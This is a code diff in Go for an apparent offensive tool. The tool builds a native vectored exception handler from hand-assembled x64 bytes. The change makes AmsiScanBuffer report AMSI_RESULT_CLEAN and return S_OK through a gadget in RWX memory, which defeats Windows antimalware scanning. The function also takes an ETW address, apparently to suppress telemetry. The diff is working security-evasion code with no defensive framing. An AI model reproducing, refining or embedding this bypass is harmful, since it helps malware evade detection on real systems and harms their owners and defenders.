@@ -229,13 +229,24 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	code = append(code, 0x00) // placeholder
 
 	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget.
-	// Instead of simulating a RET by modifying Rsp/Rip in the context (which
-	// can corrupt CLR thread state), we redirect Rip to a small gadget in our
-	// own RWX handler memory. The gadget executes "xor eax, eax; ret", which
-	// naturally returns S_OK (0) to AmsiScanBuffer's caller via the normal
-	// x64 RET instruction, preserving correct stack unwinding.
+	// The gadget executes "xor eax, eax; ret", naturally returning S_OK (0)
+	// to AmsiScanBuffer's caller via the CPU's native RET instruction.
 	//
-	// The gadget address is stored in the data block at offset 0x10.
+	// Also write AMSI_RESULT_CLEAN (0) to the output parameter (6th arg at
+	// [Rsp+0x30]) so the caller sees a clean scan result.
+	//
+	// Write AMSI_RESULT_CLEAN to output param:
+	// Load context.Rsp
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)
+	// Load AMSI_RESULT* from [Rsp+0x30] (6th parameter)
+	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
+	// Test rax, rax (skip write if NULL pointer)
+	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
+	code = append(code, 0x74, 0x06)                   // jz skip_write (over next 6 bytes)
+	// Write AMSI_RESULT_CLEAN (0) to *result
+	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
+	// skip_write:
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
 	// Set context.Rip to gadget address: [rbx+0xF8] = rax
